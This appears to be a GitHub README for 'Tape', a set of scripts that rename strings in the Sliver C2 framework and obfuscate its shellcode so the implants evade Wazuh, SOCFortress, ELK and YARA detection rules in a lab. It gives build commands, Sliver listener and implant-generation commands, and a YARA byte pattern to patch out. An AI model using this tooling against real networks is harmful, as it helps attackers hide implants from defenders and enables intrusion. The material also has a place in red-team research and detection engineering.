# Tape
Scotch-Tape usage for [Sliver](https://github.com/BishopFox/sliver) obfuscation  
This technique looks a bit like this ...
<p align="center">
  <img src="./image/jim-carrey-tape.gif" alt="jimmy-jim width="290" height="290" />
</p>  


## In Labs - GOAD with Wazuh Activated    
1. Yes, I know that just tweaking some settings in Havoc allows the demon.bin to be executed on GOAD (on Socfortress rules machines) without issues. But in this case, my goal was to achieve the same thing manually with [Sliver](https://github.com/BishopFox/sliver), which allowed me to learn much more about this C2.
And for Havoc, if you didn't know—now you know.    
2. In this case, we will bypass and obfuscate our payload with minimal effort. (If my calculations are correct: Socfortress—out, ELK multi sliver rules—out, Wazuh sliver YARA rules—out. I’m not considering Defender in my equation because some built-in bypasses in the implant can still be flagged, even in this case.)  

## Taping.sh  

### Prerequisite for GVM - only v1.5 version of sliver
```bash
bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
source . /root/.gvm/scripts/gvm
```

1. Clone [Sliver](https://github.com/BishopFox/sliver) repository and this repo [Tape](https://github.com/Oni-kuki/Tape)  
```taping.sh
git clone https://github.com/BishopFox/sliver.git
git clone https://github.com/Oni-kuki/Tape
```
* If you want the latest stable version of sliver (v1.5.43) go in sliver repo and make
```
git checkout v.1.5.43
``` 
2. Go in [Tape](https://github.com/Oni-kuki/Tape) repo 
```taping.sh
cd Tape
``` 
3. Modify first variables on the [Taping.sh](https://github.com/Oni-kuki/Tape/blob/main/taping.sh) script (no space, no problematic special character)  
```taping.sh
var1=XXXXX #replacement of bishopfox
var2=XXXXX #replacement of sliver
var3=XXXXX #replacement of Sliver 
```
4. Execute [Taping.sh](https://github.com/Oni-kuki/Tape/blob/main/taping.sh)
```taping.sh
# in this example, but you can specify the folder where sliver is located depending on your clone 
sudo ./taping.sh version 1.5 ../sliver/
sudo ./taping.sh version 1.6 ../sliver/
```  

### Some explanation and OPSEC Recomendations
> [!NOTE]  
> Version 1.5 or 1.6 are reference to [Sliver](https://github.com/BishopFox/sliver) version
> 1.6 is still in development so use it with caution (do not use it in production).   
> I add some new features to make easier the external building, now with --ext argument we can build external-builder with 1.6 donut-loader wich are more OPSEC for implant and build the server with the 1.5 donut-loader wich are more OPSEC for the execute-assembly function.  
> So at the end we will have 3 binaries external-server (just for implant creation), client, and the server.  

```taping.sh
# in this example, but you can specify the folder where sliver is located depending on your clone
sudo ./taping.sh version 1.5 ../sliver/ --ext
sudo ./taping.sh version 1.6 ../sliver/ --ext
```

#### Why did I make this ? 
Because the Donut loader in version 1.6 doesn't allow the execute-assembly method to work correctly.
I tested a lot of things to understand why, and I isolated the fact that the loader cannot retrieve the output. This might be linked to the AMSI patch (the bypasses are applied in two ways: one for Donut itself, (for implant) and the other in the loader for execute-assembly). However, I haven't delved too deeply into the subject yet.  

Regardless, version 1.6 is quieter for the implant, while version 1.5 works better for execute-assembly. In any case, version 1.5 is more stable and production-ready.  

> [!CAUTION]  
> This takes a while, so be patient  
> I highly recommend reading the script, because it's necessary to make some modification on it, in link with your fork  

## Scotch.py  
This script can be used independently of this repo, (if you have read the [Taping.sh](https://github.com/Oni-kuki/Tape/blob/main/taping.sh) you'll notice some redundancy in the obfuscation techniques.)  

```
python3 scotch.py FILE
```

> [!CAUTION] 
> Depending on your listener, not every obfuscation technique can be applied. By default, the obfuscation is set for an mTLS listener.   
> So again Read the script

```sliver
mtls -L HOST_IP -l port -p
generate -m HOST_IP:PORT -G --skip-symbols -f shellcode -s ./FOLDER/TO/SAVE
```
## Last but not Least  
I don't have automated one particular obfuscation (wireguard strings because it's still a bit tricky)  
You can make it manually with ghidra for the moment, I will automated in a few days.  
the hex to change is based on this rule part :
```
$p1 = {66 81 ?? 77 67}
```
Use the yara rule to identify correctly the Hex part; it's more precise.  